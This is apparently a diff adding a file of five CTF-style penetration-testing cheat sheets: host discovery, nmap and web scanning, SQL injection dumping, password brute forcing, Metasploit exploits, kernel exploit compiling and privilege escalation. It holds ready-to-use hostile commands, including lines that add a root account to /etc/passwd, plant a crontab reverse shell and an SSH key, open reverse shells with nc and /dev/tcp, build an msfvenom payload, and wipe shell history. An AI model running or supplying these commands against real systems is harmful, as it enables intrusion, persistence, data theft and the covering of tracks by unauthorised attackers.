@@ -1,0 +1,245 @@
+Process 01 :
+
+netdiscover -r 192.168.1.0/24    # Scan the network for live hosts
+arp-scan -l                      # Another way to list live hosts
+
+nmap -sC -sV -A -p- <TARGET-IP>   # Full scan with version detection & scripts
+rustscan -a <TARGET-IP> --ulimit 5000  # Faster scanning with RustScan
+
+nmap -p 22,80,443 --script=vuln <TARGET-IP>   # Check for known vulnerabilities
+nikto -h http://<TARGET-IP>                   # Web server vulnerability scan
+whatweb http://<TARGET-IP>                     # Identify web technologies
+
+gobuster dir -u http://<TARGET-IP> -w /usr/share/wordlists/dirb/common.txt
+wfuzz -c -z file,/usr/share/wordlists/dirb/common.txt --hc 404 http://<TARGET-IP>/FUZZ
+
+sqlmap -u "http://<TARGET-IP>/page.php?id=1" --dbs
+sqlmap -u "http://<TARGET-IP>/page.php?id=1" --dbs --dump-all
+
+hydra -l admin -P /usr/share/wordlists/rockyou.txt ftp://<TARGET-IP>
+
+searchsploit apache 2.4
+
+msfconsole
+use exploit/unix/webapp/phpmyadmin_lfi
+set RHOST <TARGET-IP>
+exploit
+
+find / -perm -u=s -type f 2>/dev/null
+find / -writable -type d 2>/dev/null
+
+uname -a
+searchsploit linux kernel
+
+wget http://exploit-db.com/exploits/xxxx.c
+gcc xxxx.c -o exploit && ./exploit
+
+sudo -l
+
+sudo /bin/bash
+cat /etc/crontab
+
+
+Process 02 :
+nmap -sV -sC -p- <target_ip>
+nmap -sV -p <port> <target_ip>
+
+dirb http://<target_ip> /usr/share/wordlists/dirb/common.txt
+smbclient -L //<target_ip>/
+
+searchsploit <service_name>
+
+msfconsole
+use exploit/<exploit_path>
+set RHOSTS <target_ip>
+set RPORT <port>
+run
+
+gcc exploit.c -o exploit
+./exploit
+
+linpeas.sh
+
+find / -perm -u=s -o -perm -g=s 2>/dev/null
+
+uname -a
+searchsploit <kernel_version>
+
+crontab -l
+ls -la /etc/cron*
+
+sudo -l
+
+find / -name flag.txt 2>/dev/null
+find / -name root.txt 2>/dev/null
+
+cat /path/to/flag.txt
+
+
+Process 03 :
+
+nmap -sS -sV -p- <target_ip>
+nmap --script vuln <target_ip>
+nikto -h <target_ip>
+gobuster dir -u http://<target_ip> -w /usr/share/wordlists/dirb/common.txt
+nikto -h http://<target_ip>
+
+msfconsole
+use exploit/unix/ftp/vsftpd_234_backdoor
+set RHOST <target_ip>
+set RPORT <port>
+exploit
+
+searchsploit <service_name>
+
+searchsploit -m <path_to_exploit>
+chmod +x <exploit_file>
+./<exploit_file>
+
+find / -perm -4000 2>/dev/null
+
+uname -a
+
+wget https://github.com/carlospolop/PEASS-ng/releases/download/20231028/linpeas.sh
+chmod +x linpeas.sh
+./linpeas.sh
+
+msfconsole
+use exploit/unix/local/linux/priv_escalation
+set SESSION <session_id>
+exploit
+
+
+Process 04 :
+
+netdiscover -r 192.168.1.0/24  # For local network
+arp-scan -l                    # Another local network scan method
+
+nmap -A -p- 192.168.1.X         # Aggressive scan, all ports
+nmap --script=vuln 192.168.1.X  # Scan for vulnerabilities
+
+gobuster dir -u http://192.168.1.X -w /usr/share/wordlists/dirb/common.txt
+wfuzz -c -z file,/usr/share/wordlists/dirb/common.txt --hc 404 http://192.168.1.X/FUZZ
+
+paramspider -d 192.168.1.X
+
+sqlmap -u "http://192.168.1.X/vulnerable.php?id=1" --dbs --batch
+
+subfinder -d 192.168.1.X
+
+enum4linux -a 192.168.1.X
+smbclient -L \\\\192.168.1.X
+
+ftp 192.168.1.X
+
+hydra -l root -P /usr/share/wordlists/rockyou.txt 192.168.1.X ssh
+
+curl http://192.168.1.X/index.php?file=../../../../etc/passwd
+curl -X POST -d "cmd=id" http://192.168.1.X/vulnerable.php
+ping -c 1 192.168.1.X; whoami
+
+weevely generate password shell.php
+weevely http://192.168.1.X/shell.php password
+
+msfconsole
+search exploit [service]
+use exploit/multi/http/[exploit_name]
+set RHOST 192.168.1.X
+exploit
+
+find / -perm -4000 -type f 2>/dev/null
+
+cat /etc/crontab
+sudo -l
+sudo /bin/bash
+
+uname -a
+searchsploit linux kernel 4.x
+gcc exploit.c -o exploit
+./exploit
+
+cat /root/root.txt
+
+echo 'dolphin:x:0:0::/root:/bin/bash' >> /etc/passwd
+echo '* * * * * root bash -i >& /dev/tcp/192.168.1.Y/4444 0>&1' > /etc/crontab
+
+Process 05:
+
+netdiscover -r 192.168.1.0/24
+arp-scan -l
+
+nmap -sC -sV -A -p- <TARGET-IP>
+rustscan -a <TARGET-IP> --ulimit 5000 | tee rustscan_output.txt
+masscan -p1-65535,U:1-65535 <TARGET-IP> --rate 1000
+
+whatweb <TARGET-IP>
+gobuster dir -u http://<TARGET-IP> -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,html,txt
+nikto -h http://<TARGET-IP>
+
+wfuzz -c -w /usr/share/wordlists/dirb/common.txt --hc 404 http://<TARGET-IP>/FUZZ/
+sublist3r -d <TARGET-IP>
+
+searchsploit <service_name>
+searchsploit -x <exploit_id>
+
+nmap --script vuln -p <PORT> <TARGET-IP>
+
+sqlmap -u "http://<TARGET-IP>/page.php?id=1" --dbs --batch
+sqlmap -u "http://<TARGET-IP>/page.php?id=1" -D database_name --tables
+
+curl http://<TARGET-IP>/index.php?page=../../../../etc/passwd
+wfuzz -c -w /usr/share/wordlists/wfuzz/Injections/LFI.txt --hc 404 http://<TARGET-IP>/index.php?page=FUZZ
+
+curl -X POST -d "cmd=whoami" http://<TARGET-IP>/rce.php
+
+hydra -L users.txt -P passwords.txt <TARGET-IP> ssh
+medusa -h <TARGET-IP> -u admin -P rockyou.txt -M http
+
+smbclient -L //<TARGET-IP>
+smbclient //<TARGET-IP>/share -U user
+enum4linux -a <TARGET-IP>
+
+find / -perm -u=s -type f 2>/dev/null
+find / -perm -4000 -exec ls -la {} 2>/dev/null \;
+find / -perm -2000 -exec ls -la {} 2>/dev/null \;
+find / -writable -type d 2>/dev/null
+
+cat /etc/crontab
+ls -la /etc/cron*
+ps aux | grep root
+
+uname -a
+searchsploit linux kernel
+wget http://exploit-db.com/exploits/12345.c -O exploit.c
+gcc exploit.c -o exploit
+chmod +x exploit
+./exploit
+
+echo 'hacker:x:0:0:hacker:/root:/bin/bash' >> /etc/passwd
+su hacker
+
+sudo -l
+sudo <binary> <exploit>
+
+python3 -c 'import pty; pty.spawn("/bin/bash")'
+echo os.system('/bin/bash')
+
+cat /root/proof.txt
+cat /home/user/user.txt
+
+echo "ssh-rsa AAAAB3..." >> ~/.ssh/authorized_keys
+ssh -i mykey user@<TARGET-IP>
+
+nc -e /bin/sh <YOUR-IP> <PORT>
+bash -i >& /dev/tcp/<YOUR-IP>/<PORT> 0>&1
+msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=<YOUR-IP> LPORT=4444 -f elf > shell.elf
+
+history -c
+rm /tmp/*.sh
+exit
+
+
+
+
+
+
